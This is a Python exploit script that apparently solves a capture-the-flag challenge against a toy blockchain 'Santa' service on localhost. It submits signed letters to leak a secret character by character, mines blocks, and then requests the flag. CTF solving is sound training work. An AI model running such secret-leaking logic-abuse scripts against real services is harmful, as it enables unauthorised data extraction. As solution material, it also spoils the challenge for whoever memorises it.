#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Patched all-in-one exploit for the "North-Poole" CTF challenge.
Key changes:
 - Miner uses txpool's canonical head hash as prev_hash and re-validates before submit.
 - This makes mining blocks that include txpool reliable, so letters and the final secret are processed.

Workflow:
 1) Submits 32 signed letters from identity "hacker" asking for "secret index #<i>" for i=0..31.
 2) Optionally mines blocks to speed confirmations (with safe parent handling).
 3) Collects Santa's queued gifts from /txpool and mined blocks to reconstruct SECRET_GIFT.
 4) Submits a final letter containing SECRET_GIFT so Santa gifts FLAG_GIFT.
 5) Prints the flag from /txpool or, if already mined, scans the chain.

Environment:
 - Set NORTH_POOLE=http://localhost (default) or another base URL.
 - Ensure /challenge/keys/hacker/key exists and is readable.
Run:
 python3 north_pole_exploit_patched.py --mine
"""
import os
import sys
import time
import json
import uuid
import hashlib
import argparse
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import requests
from cryptography.hazmat.primitives import serialization

# ------ Configuration ------
NORTH_POOLE = os.environ.get("NORTH_POOLE", "http://localhost")
KEY_PATH = Path("/challenge/keys/hacker/key")
LETTER_HEADER = "Dear Santa,\n\nFor christmas this year I would like "
DIFFICULTY = 16
DIFFICULTY_PREFIX = "0" * (DIFFICULTY // 4)  # 4 hex zeros for 16 bits
MAX_NICE_HACKER = 10

# ------ Key loading and signing ------
priv = serialization.load_ssh_private_key(KEY_PATH.read_bytes(), password=None)

def sha256_json(payload: dict) -> bytes:
    msg = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(msg.encode()).digest()

def sign_tx(payload: dict) -> str:
    return priv.sign(sha256_json(payload)).hex()

# ------ HTTP helpers ------
def http_get(path: str, **kwargs):
    url = f"{NORTH_POOLE}{path}"
    r = requests.get(url, timeout=kwargs.pop("timeout", 5), **kwargs)
    r.raise_for_status()
    return r

def http_post(path: str, json_body: dict, **kwargs):
    url = f"{NORTH_POOLE}{path}"
    r = requests.post(url, json=json_body, timeout=kwargs.pop("timeout", 5), **kwargs)
    return r

# ------ Chain utilities ------
def hash_block(block: dict) -> str:
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()

def get_head() -> Tuple[str, dict]:
    j = http_get("/block").json()
    return j["hash"], j["block"]

def get_chain_from_head() -> List[dict]:
    head_hash, head_block = get_head()
    chain = [head_block]
    current_hash = head_block.get("prev_hash")
    while current_hash:
        try:
            r = http_get("/block", params={"hash": current_hash})
        except Exception:
            break
        j = r.json()
        blk = j.get("block")
        if not blk:
            break
        chain.append(blk)
        current_hash = blk.get("prev_hash")
    chain.reverse()
    return chain

# ------ Mining (patched) ------
def get_txpool_for_head() -> Tuple[str, List[dict]]:
    j = http_get("/txpool").json()
    return j.get("hash"), j.get("txs", [])

def mine_block_once(nice_candidate: Optional[str] = None) -> bool:
    """Attempt to mine and submit one block using the txpool snapshot.
    Includes txpool txs in the block; sets nice to nice_candidate only when safe.
    Returns True on acceptance.
    """
    try:
        tx_head_hash, txs = get_txpool_for_head()
        # Parent index (do NOT recompute parent hash)
        r = http_get("/block", params={"hash": tx_head_hash})
        parent = r.json()["block"]
        parent_index = parent["index"]
        # Decide nice field
        nice = None
        if nice_candidate and all(tx.get("src") != nice_candidate for tx in txs):
            nice = nice_candidate
        block = {
            "index": parent_index + 1,
            "prev_hash": tx_head_hash,  # canonical parent hash
            "nonce": 0,
            "txs": txs,
            "nice": nice,
        }
        # PoW
        nonce = 0
        while True:
            block["nonce"] = nonce
            h = hash_block(block)
            if h.startswith(DIFFICULTY_PREFIX):
                break
            nonce += 1
        # Re-validate parent just before submit
        latest_hash, _ = get_txpool_for_head()
        if latest_hash != block["prev_hash"]:
            return False
        resp = http_post("/block", json_body=block)
        return resp.status_code == 200
    except Exception:
        return False

# ------ Exploit steps ------
def submit_index_letters(count: int = 32) -> List[str]:
    nonces = []
    for i in range(count):
        nonce = f"{i}-{uuid.uuid4()}"
        letter_text = f"{LETTER_HEADER}secret index #{i}"
        tx = {
            "src": "hacker",
            "dst": "santa",
            "type": "letter",
            "letter": letter_text,
            "nonce": nonce,
        }
        tx["sig"] = sign_tx(tx)
        r = http_post("/tx", json_body=tx)
        print(f"[submit] i={i} nonce={nonce} status={r.status_code} resp={r.text.strip()}")
        nonces.append(nonce)
        time.sleep(0.2)
    return nonces

def collect_secret_chars(expected_count: int = 32, dst_child: str = "hacker") -> str:
    chars: Dict[int, str] = {}
    seen_gift_nonces = set()
    print("[collector] watching for Santa's per-index gifts...")
    start = time.time()
    while len(chars) < expected_count:
        # txpool
        try:
            j = http_get("/txpool").json()
            for tx in j.get("txs", []):
                if tx.get("type") == "gift" and tx.get("src") == "santa" and tx.get("dst") == dst_child:
                    gift = tx.get("gift", "")
                    nonce = tx.get("nonce", "")
                    if nonce in seen_gift_nonces:
                        continue
                    if len(gift) == 1 and "-gift" in nonce:
                        seen_gift_nonces.add(nonce)
                        idx_part = nonce.split("-")[0]
                        try:
                            idx = int(idx_part)
                            if idx not in chars:
                                chars[idx] = gift
                                print(f"[collector] from txpool: index {idx} -> {gift}")
                        except ValueError:
                            pass
        except Exception as e:
            print("[collector] txpool error:", e)
        # chain fallback
        try:
            chain = get_chain_from_head()
            for blk in chain:
                for tx in blk.get("txs", []):
                    if tx.get("type") == "gift" and tx.get("src") == "santa" and tx.get("dst") == dst_child:
                        gift = tx.get("gift", "")
                        nonce = tx.get("nonce", "")
                        if len(gift) == 1 and "-gift" in nonce:
                            idx_part = nonce.split("-")[0]
                            try:
                                idx = int(idx_part)
                                if idx not in chars:
                                    chars[idx] = gift
                                    print(f"[collector] from chain: index {idx} -> {gift}")
                            except ValueError:
                                pass
        except Exception as e:
            print("[collector] chain scan error:", e)
        if len(chars) >= expected_count:
            break
        time.sleep(1)
        if time.time() - start > 600:
            print("[collector] still waiting... consider running with --mine to speed it up.")
    secret = "".join(chars[i] for i in range(expected_count))
    print(f"[collector] SECRET_GIFT reconstructed: {secret}")
    return secret

def request_flag_with_secret(secret: str, dst_child: str = "hacker") -> None:
    letter_text = f"{LETTER_HEADER}{secret}"
    nonce = str(uuid.uuid4())
    tx = {
        "src": dst_child,
        "dst": "santa",
        "type": "letter",
        "letter": letter_text,
        "nonce": nonce,
    }
    tx["sig"] = sign_tx(tx)
    r = http_post("/tx", json_body=tx)
    print(f"[flag-request] status={r.status_code} resp={r.text.strip()} nonce={nonce}")


def wait_for_flag(dst_child: str = "hacker") -> Optional[str]:
    print("[flag] watching for Santa's flag gift...")
    start = time.time()
    while True:
        try:
            j = http_get("/txpool").json()
            for tx in j.get("txs", []):
                if tx.get("type") == "gift" and tx.get("src") == "santa" and tx.get("dst") == dst_child:
                    gift = tx.get("gift", "")
                    if len(gift) > 1:
                        print(f"[flag] Found in txpool: {gift}")
                        return gift
        except Exception:
            pass
        # Fallback: scan chain for mined flag
        try:
            chain = get_chain_from_head()
            for blk in chain:
                for tx in blk.get("txs", []):
                    if tx.get("type") == "gift" and tx.get("src") == "santa" and tx.get("dst") == dst_child:
                        gift = tx.get("gift", "")
                        if len(gift) > 1:
                            print(f"[flag] Found in chain: {gift}")
                            return gift
        except Exception:
            pass
        if time.time() - start > 600:
            print("[flag] still waiting after 10 minutes...")
            start = time.time()
        time.sleep(1)

# ------ Main orchestration ------
def main():
    ap = argparse.ArgumentParser(description="North-Poole all-in-one exploit (patched miner)")
    ap.add_argument("--mine", action="store_true", help="Run a helper miner to speed confirmations and include txpool")
    ap.add_argument("--no-submit", action="store_true", help="Skip submitting index letters (just collect)")
    args = ap.parse_args()

    if not args.no_submit:
        submit_index_letters(count=32)

    # Collect the secret
    secret = collect_secret_chars(expected_count=32, dst_child="hacker")

    # Immediately request the flag
    request_flag_with_secret(secret, dst_child="hacker")

    # Ensure the final letter gets mined + confirmed: mine 1 txpool-including block, then 4 more blocks
    if args.mine:
        # Pause: mine one block including txpool to capture the final letter
        print("[mine] ensuring final letter is included in a block...")
        attempts = 0
        while True:
            attempts += 1
            accepted = mine_block_once(nice_candidate=None)
            if accepted:
                print("[mine] final-letter block accepted.")
                break
            else:
                if attempts % 5 == 0:
                    print("[mine] still racing head; retrying...")
                time.sleep(0.05)
        # Add 4 confirmations (empty blocks are fine)
        print("[mine] adding 4 confirmations...")
        added = 0
        while added < 4:
            # Mine empty blocks; they are quick and avoid txpool races
            ok = mine_block_once(nice_candidate=None)  # will include txpool; but if empty, still fine
            if ok:
                added += 1
                print(f"[mine] confirmation {added}/4 accepted")
            else:
                time.sleep(0.05)

    # Now wait for the flag gift
    flag = wait_for_flag(dst_child="hacker")
    if flag:
        print("\n==== FLAG ====")
        print(flag)
        print("==============")
    else:
        print("[main] flag not observed yet; keep watching the txpool/chain.")

if __name__ == "__main__":
    main()
